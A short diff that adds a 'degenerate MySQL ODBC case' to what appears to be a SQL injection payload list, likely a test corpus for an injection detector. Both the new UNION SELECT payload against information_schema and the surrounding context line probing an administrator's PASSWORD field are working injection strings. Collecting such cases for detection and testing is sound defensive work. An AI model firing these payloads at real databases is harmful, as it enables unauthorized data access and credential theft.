@@ -627,3 +627,9 @@ ANY((SELECT 1)) - 1 UNION ALL --
 # http://www.exploit-db.com/exploits/28854/
 #
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
+
+#
+# Thanks to @rsalgado
+# A degenerate MySQL ODBC case
+#
+-{``.``.id} union select table_name FROM information_schema.tables LIMIT 1
